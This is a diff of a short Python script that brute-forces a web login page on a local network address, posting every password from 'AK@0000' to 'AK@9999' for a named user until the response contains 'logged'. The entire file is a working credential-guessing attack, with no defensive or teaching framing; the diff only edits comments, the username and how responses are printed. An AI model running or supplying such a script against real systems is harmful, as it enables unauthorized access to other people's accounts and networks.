@@ -1,31 +1,33 @@
 import requests
 
-# URL to send the request
+# Target URL
 url = "http://192.168.1.1:8090/login.xml"
 
-# Base password without digits
+# Base password prefix
 base_password = "AK@"
 
 # Other form data
 payload = {
     "mode": "191",
-    "username": "anand.kumar",
+    "username": "Fgg",
     "a": "1738155857532",
     "producttype": "2"
 }
 
 # Loop through all four-digit combinations (0000-9999)
 for i in range(10000):
-    password = f"{base_password}{i:04d}"  # Format as four-digit (e.g., 0001, 0999)
+    password = f"{base_password}{i:04d}"  # Generates passwords AK@0000 to AK@9999
     payload["password"] = password
-    
+
     try:
         response = requests.post(url, data=payload)
-        print(f"Trying: {password} | Status: {response.status_code}")
-        
-        if "logged" in response.text.lower():
+        response_text = response.text.strip().lower()  # Normalize response text
+
+        print(f"Trying: {password} | Response: {response_text}")
+
+        if "logged" in response_text:
             print(f"\nSuccess! Logged in with password: {password}")
-            break  # Stop if "logged" is found
+            break  # Stop the loop if "logged" is found
 
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
